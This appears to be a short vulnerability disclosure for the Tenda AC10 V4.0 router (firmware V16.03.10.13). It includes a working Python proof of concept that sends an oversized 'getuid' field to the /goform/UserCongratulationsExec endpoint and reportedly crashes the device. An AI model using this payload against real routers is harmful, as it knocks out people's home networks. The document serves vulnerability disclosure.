# Tenda AC10V4.0 V16.03.10.13 has a buffer overflow vulnerability

# Vulnerable URL
http://192.168.85.160/goform/UserCongratulationsExec

# Vulnerability Description

Tenda AC10 is a dual-band three-gigabit wireless router suitable for fiber-optic homes within 1000 megabits, supporting gigabit ports, intelligent frequency selection, parental control and other functions. Shenzhen Jixiang Tenda Technology Co., Ltd. 
AC10 has a binary vulnerability that can be exploited by attackers to cause a denial of service.

# Firmware Information

https://www.tenda.com.cn/download/detail-3518.html
![image](https://github.com/user-attachments/assets/9986c299-ccf8-43c2-bc79-a586fa663a31)

# Payload：
```
import requests

url = "http://192.168.85.160/goform/UserCongratulationsExec"
data = {
    "getuid":b'A'*1000000000
}
res = requests.post(url=url,data=data)
print(res.content)
```

<img width="556" alt="image" src="https://github.com/user-attachments/assets/aa2d3ad6-cc37-4a9a-9179-d0a850c204e8" />

When running the exp.py script, the memory is filled up and the device crashes.

<img width="640" alt="image" src="https://github.com/user-attachments/assets/737f36bc-8bfd-4a66-be20-3f1c13382801" />

![image](https://github.com/user-attachments/assets/bc784f32-fbfe-4fd6-9807-7cc0a3e65fa3)

